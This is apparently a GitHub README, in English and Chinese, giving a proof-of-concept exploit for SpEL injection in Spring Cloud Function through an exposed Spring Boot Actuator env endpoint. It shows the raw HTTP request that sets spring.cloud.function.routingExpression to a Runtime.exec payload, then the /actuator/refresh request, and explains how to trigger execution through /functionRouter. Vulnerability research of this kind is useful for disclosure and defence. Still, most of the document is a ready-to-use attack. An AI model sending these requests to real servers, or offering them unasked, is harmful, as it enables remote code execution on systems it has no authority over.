# springboot-actuator-routingExpression-rce

Spring Cloud Function SPEL injection with the help of actuator.

It is clearly like as the Spring Cloud Gateway rce(CVE-2022-22947).As we can request env endpoint of Spring boot actuator just like this below:

The first step is to revalue the spring.cloud.function.routingExpression  so that it produces an evil SPEL.

```

POST /actuator/env HTTP/1.1
Host: 127.0.0.1:9000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Content-Type: application/json
Content-Length: 109

{"name":"spring.cloud.function.routingExpression","value":"T(java.lang.Runtime).getRuntime().exec('calc')"}

```
The next step is to refresh the environment variables.

```
POST /actuator/refresh HTTP/1.1
Host: 127.0.0.1:9000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
```



# 基于Spring boot actuator的Spring-Cloud-Function SPEL注入
- Spring Coud Function 官方在最新版本3.2.3 已经修复了之前的commit为dc5128b 的SPEL注入漏洞。但笔者发现配置文件中的spring.cloud.function.routingExpression参数也存在SPEL注入点，因此理论上只要能够控制functionProperties.getRoutingExpression() 的值就能够触发这个漏洞。
- 当项目中引入了actuator 并且开启了env 端点，那么就可以实现RCE。

请求/env端点，写入配置：
![image](https://user-images.githubusercontent.com/79240946/165094266-0a008c95-9592-488f-9c79-85fcf568e676.png)


请求/refresh端点，刷新配置生效：
![image](https://user-images.githubusercontent.com/79240946/165094196-7a6cb6db-851b-46bf-941c-6fedf716721b.png)

最后通过请求/functionRouter 执行routingExpression 

![image](https://user-images.githubusercontent.com/79240946/165094327-40ca83a3-193a-460b-9836-636f229f5b4c.png)

# 更多
[公众号文章](https://mp.weixin.qq.com/s?__biz=MzIzMjYzNTQwMA==&mid=2247484304&idx=1&sn=ed5c807aaf0abdf07f27a26b23663238&chksm=e890aef7dfe727e16c28d1119a522b03c6e20e599ccd07cb4b36469aef4058f3d0a11cc7fb25#rd)
